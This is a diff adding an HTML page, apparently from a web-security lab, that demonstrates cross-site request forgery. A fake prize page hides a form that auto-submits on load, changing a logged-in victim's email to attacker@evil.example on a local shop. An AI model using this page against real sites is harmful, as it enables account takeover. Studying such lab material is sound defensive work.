@@ -1,0 +1,26 @@
+<!doctype html>
+<!--
+  Trang cua ke tan cong. Nan nhan dang dang nhap shop.local chi can mo trang
+  nay la form tu dong submit sang /change-email, kem theo cookie phien cua
+  nan nhan (trinh duyet tu dinh kem). Khong can nan nhan bam gi.
+
+  Trong thuc te trang nay nam o mot domain khac (vd evil.example). O lab ta
+  tro thang toi 127.0.0.1:8052 de minh hoa.
+-->
+<html>
+<head><meta charset="utf-8"><title>Ban trung thuong! Bam vao day</title></head>
+<body>
+  <h1>Chuc mung! Ban nhan duoc qua tang</h1>
+  <p>Dang tai...</p>
+
+  <!-- Form an, tu gui sang endpoint doi email cua nan nhan -->
+  <form id="csrf" action="http://127.0.0.1:8052/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+
+  <script>
+    // Tu dong submit ngay khi trang tai xong.
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
